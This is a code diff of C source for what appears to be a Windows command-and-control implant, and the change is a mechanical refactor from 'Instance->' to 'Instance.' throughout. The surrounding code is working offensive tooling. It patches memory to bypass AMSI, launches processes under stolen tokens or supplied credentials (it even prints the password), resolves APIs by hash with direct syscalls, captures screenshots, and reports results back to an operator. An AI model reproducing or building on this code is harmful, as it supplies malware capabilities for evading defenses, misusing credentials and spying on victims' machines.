@@ -17,7 +17,7 @@ BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, 
 {
     BOOL fLoadable = FALSE;
 
-    if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
+    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
     {
         if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
         {
@@ -132,7 +132,7 @@ PVOID LdrModuleLoad( LPSTR ModuleName )
     }
 
     UnicodeString.Buffer = ModuleNameW;
-    if ( NT_SUCCESS( Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
+    if ( NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
     {
         PRINTF( "%s => [%x]\n", ModuleName, Module );
         return Module;
@@ -176,7 +176,7 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
                 AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                 AnsiString.Buffer        = FunctionName;
 
-                if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) )
+                if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) )
                 {
                     return NULL;
                 }
@@ -210,12 +210,12 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
     MemSet( UserName, 0, MAX_PATH );
     MemSet( Domain, 0, MAX_PATH );
 
-    if ( ! Instance->Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, 0, &dwLength ) )
+    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, 0, &dwLength ) )
     {
         // most likely error: ERROR_INSUFFICIENT_BUFFER
-        if ( ( TokenUserInfo = Instance->Win32.LocalAlloc( LPTR, dwLength ) ) )
+        if ( ( TokenUserInfo = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
-            if ( ! Instance->Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, dwLength, &dwLength ) )
+            if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, dwLength, &dwLength ) )
             {
                 PRINTF( "[!] Couldn't get Token Information: %d\n", NtGetLastError() )
                 return NULL;
@@ -223,7 +223,7 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
         }
     }
 
-    if ( ! Instance->Win32.LookupAccountSidA( NULL, ( ( PTOKEN_USER ) TokenUserInfo )->User.Sid, UserName, &UserNameSize, Domain, &DomainSize, &SidType ) )
+    if ( ! Instance.Win32.LookupAccountSidA( NULL, ( ( PTOKEN_USER ) TokenUserInfo )->User.Sid, UserName, &UserNameSize, Domain, &DomainSize, &SidType ) )
     {
         PRINTF( "[%s] LookupAccountSidA failed: %d\n", __FUNCTION__, NtGetLastError() );
         CALLBACK_GETLASTERROR
@@ -231,7 +231,7 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
     }
 
     *UserSize  = UserNameSize + 1 + DomainSize;
-    UserDomain = Instance->Win32.LocalAlloc( LPTR, *UserSize );
+    UserDomain = Instance.Win32.LocalAlloc( LPTR, *UserSize );
 
     StringConcatA( UserDomain, Domain );
     StringConcatA( UserDomain, Deli );
@@ -250,13 +250,13 @@ HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
     OBJECT_ATTRIBUTES ObjectAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
     NTSTATUS          NtStatus    = STATUS_SUCCESS;
 
-    NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, Access, &ObjectAttr, &ClientID );
+    NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, Access, &ObjectAttr, &ClientID );
     if ( NT_SUCCESS( NtStatus ) )
     {
         return hProcess;
     }
 
-    NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
 
     return NULL;
 }
@@ -265,7 +265,7 @@ BOOL ProcessIsWow( HANDLE hProcess )
 {
     PVOID ProcessWowInfo = NULL;
 
-    if ( ! NT_SUCCESS( Instance->Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &ProcessWowInfo, sizeof( PVOID ), NULL ) ) )
+    if ( ! NT_SUCCESS( Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &ProcessWowInfo, sizeof( PVOID ), NULL ) ) )
     {
         PUTS( "[!] NtQueryInformationProcess Failed" )
         return FALSE;
@@ -294,7 +294,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     if ( Piped )
     {
         PUTS( "Piped enabled" )
-        AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
+        AnonPipe = Instance.Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
         AnonPipesInit( AnonPipe );
 
@@ -316,7 +316,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     if ( EnableWow64 )
     {
         PUTS( "Enable Wow64 process support" )
-        if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
+        if ( ! Instance.Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
         {
             PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -325,28 +325,28 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         }
     }*/
 
-    if ( Instance->Tokens.Impersonate )
+    if ( Instance.Tokens.Impersonate )
     {
         PUTS( "Impersonate" )
 
         LPWSTR lpCurrentDirectory   = NULL;
         WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
 
-        if ( Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) )
+        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) )
             lpCurrentDirectory = Path;
 
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
-        CommandLineW = Instance->Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
+        CommandLineW = Instance.Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
         CharStringToWCharString( CommandLineW, CmdLine, CommandLineSize );
 
         PRINTF( "CommandLineW[%d]  : %ls\n", CommandLineSize, CommandLineW )
         PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )
 
-        if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
+        if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
             PUTS( "CreateProcessWithTokenW" )
-            if ( ! Instance->Win32.CreateProcessWithTokenW(
-                    Instance->Tokens.Token->Handle,
+            if ( ! Instance.Win32.CreateProcessWithTokenW(
+                    Instance.Tokens.Token->Handle,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
                     CommandLineW,
@@ -364,14 +364,14 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                 goto Cleanup;
             }
         }
-        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
+        else if ( Instance.Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
             PUTS( "CreateProcessWithLogonW" )
-            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
-            if ( ! Instance->Win32.CreateProcessWithLogonW(
-                        Instance->Tokens.Token->lpUser,
-                        Instance->Tokens.Token->lpDomain,
-                        Instance->Tokens.Token->lpPassword,
+            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance.Tokens.Token->lpUser, Instance.Tokens.Token->lpDomain, Instance.Tokens.Token->lpPassword )
+            if ( ! Instance.Win32.CreateProcessWithLogonW(
+                        Instance.Tokens.Token->lpUser,
+                        Instance.Tokens.Token->lpDomain,
+                        Instance.Tokens.Token->lpPassword,
                         LOGON_NETCREDENTIALS_ONLY,
                         App,
                         CommandLineW,
@@ -391,12 +391,12 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         }
 
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
-        Instance->Win32.LocalFree( CommandLineW );
+        Instance.Win32.LocalFree( CommandLineW );
         CommandLineW = NULL;
     }
     else
     {
-        if ( ! Instance->Win32.CreateProcessA(
+        if ( ! Instance.Win32.CreateProcessA(
                 App,
                 CmdLine,
                 NULL,
@@ -421,7 +421,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     TODO: doesn't work. always getting ERROR_INVALID_FUNCTION
     if ( EnableWow64 )
     {
-        if ( ! Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
+        if ( ! Instance.Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
         {
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             Return = FALSE;
@@ -431,7 +431,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
      */
 
     /* Check if we managed to spawn a process */
-    if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
+    if ( ProcessInfo->hProcess && Instance.Config.Implant.Verbose )
     {
         PUTS( "Send info back" )
         if ( ! CmdLine )
@@ -444,7 +444,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         {
             INT32 i = 0;
             INT32 x = ( INT32 ) StringLengthA( CmdLine );
-            PCHAR s = Instance->Win32.LocalAlloc( LPTR, x );
+            PCHAR s = Instance.Win32.LocalAlloc( LPTR, x );
 
             MemCopy( s, CmdLine, x );
 
@@ -462,14 +462,14 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
             PUTS( "Cleanup" )
             MemSet( s, 0, x );
-            Instance->Win32.LocalFree( s );
+            Instance.Win32.LocalFree( s );
         }
     }
 
     if ( Piped )
     {
         PUTS( "Piped enabled" )
-        Instance->Win32.NtClose( AnonPipe->StdOutWrite );
+        Instance.Win32.NtClose( AnonPipe->StdOutWrite );
         AnonPipe->StdOutWrite = NULL;
 
         JobAdd( ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
@@ -480,7 +480,7 @@ Cleanup:
     if ( CommandLineW )
     {
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
-        Instance->Win32.LocalFree( CommandLineW );
+        Instance.Win32.LocalFree( CommandLineW );
     }
 
     PackageDestroy( Package );
@@ -527,11 +527,11 @@ BOOL BypassPatchAMSI()
     SIZE_T uSize = sizeof(amsiPatch);
 
     PUTS("NtProtectVirtualMemory")
-    if ( NT_SUCCESS( Instance->Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
+    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
     {
         MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );
 
-        if ( NT_SUCCESS( Instance->Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection ) ) )
+        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection ) ) )
             return TRUE;
 
         PUTS( "[-] Failed to change back protection" )
@@ -544,7 +544,7 @@ BOOL AnonPipesInit( PANONPIPE AnonPipes )
 {
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) )
+    if ( ! Instance.Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) )
         goto HandleError;
 
     return TRUE;
@@ -567,16 +567,16 @@ VOID AnonPipesRead( PANONPIPE AnonPipes )
     PUTS( "Start reading anon pipe" )
     PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )
 
-    Buffer = Instance->Win32.LocalAlloc( LPTR, 0 );
+    Buffer = Instance.Win32.LocalAlloc( LPTR, 0 );
     do
     {
-        Success = Instance->Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
+        Success = Instance.Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
         PRINTF( "dwRead => %d\n", dwRead )
 
         if ( dwRead == 0 )
             break;
 
-        Buffer = Instance->Win32.LocalReAlloc(
+        Buffer = Instance.Win32.LocalReAlloc(
                 Buffer,
                 dwBufferSize + dwRead,
                 LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -599,13 +599,13 @@ VOID AnonPipesClose( PANONPIPE AnonPipes )
 {
     if ( AnonPipes->StdOutRead )
     {
-        Instance->Win32.NtClose( AnonPipes->StdOutRead );
+        Instance.Win32.NtClose( AnonPipes->StdOutRead );
         AnonPipes->StdOutRead = NULL;
     }
 
     if ( AnonPipes->StdOutWrite )
     {
-        Instance->Win32.NtClose( AnonPipes->StdOutWrite );
+        Instance.Win32.NtClose( AnonPipes->StdOutWrite );
         AnonPipes->StdOutWrite = NULL;
     }
 }
@@ -625,18 +625,18 @@ BOOL W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize )
     PVOID               BitMapImage = NULL;
     PVOID               BitMapSize  = NULL;
 
-    INT x = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
-    INT y = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
+    INT x = Instance.Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
+    INT y = Instance.Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
 
     MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
     MemSet( &AllDesktops,0, sizeof( BITMAP ) );
 
-    hDC      = Instance->Win32.GetDC( NULL );
-    hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
+    hDC      = Instance.Win32.GetDC( NULL );
+    hTempMap = Instance.Win32.GetCurrentObject( hDC, OBJ_BITMAP );
 
-    Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops );
+    Instance.Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops );
 
     BitFileHdr.bfType        = ( WORD ) ( 'B' | ( 'M' << 8 ) );
     BitFileHdr.bfOffBits     = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );
@@ -652,13 +652,13 @@ BOOL W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize )
     cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;
 
     BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
-    BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
+    BitMapImage = Instance.Win32.LocalAlloc( LPTR, BitMapSize );
 
-    hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
-    hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
+    hMemDC  = Instance.Win32.CreateCompatibleDC( hDC );
+    hBitmap = Instance.Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
 
-    Instance->Win32.SelectObject( hMemDC, hBitmap );
-    Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY );
+    Instance.Win32.SelectObject( hMemDC, hBitmap );
+    Instance.Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY );
 
     MemCopy( BitMapImage, &BitFileHdr, sizeof( BITMAPFILEHEADER ) );
     MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ), &BitInfoHdr, sizeof( BITMAPINFOHEADER ) );
@@ -672,16 +672,16 @@ BOOL W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize )
 
     CLEANUP:
     if ( hTempMap )
-        Instance->Win32.DeleteObject( hTempMap );
+        Instance.Win32.DeleteObject( hTempMap );
 
     if ( hMemDC )
-        Instance->Win32.DeleteDC( hMemDC );
+        Instance.Win32.DeleteDC( hMemDC );
 
     if ( hDC )
-        Instance->Win32.ReleaseDC( NULL, hDC );
+        Instance.Win32.ReleaseDC( NULL, hDC );
 
     if ( hBitmap )
-        Instance->Win32.DeleteObject( hBitmap );
+        Instance.Win32.DeleteObject( hBitmap );
 
     return TRUE;
 }
@@ -690,9 +690,9 @@ ULONG RandomNumber32( VOID )
 {
     ULONG Seed = 0;
 
-    Seed = Instance->Win32.GetTickCount();
-    Seed = Instance->Win32.RtlRandomEx( &Seed );
-    Seed = Instance->Win32.RtlRandomEx( &Seed );
+    Seed = Instance.Win32.GetTickCount();
+    Seed = Instance.Win32.RtlRandomEx( &Seed );
+    Seed = Instance.Win32.RtlRandomEx( &Seed );
     Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;
 
     return Seed % 2 == 0 ? Seed : Seed + 1;
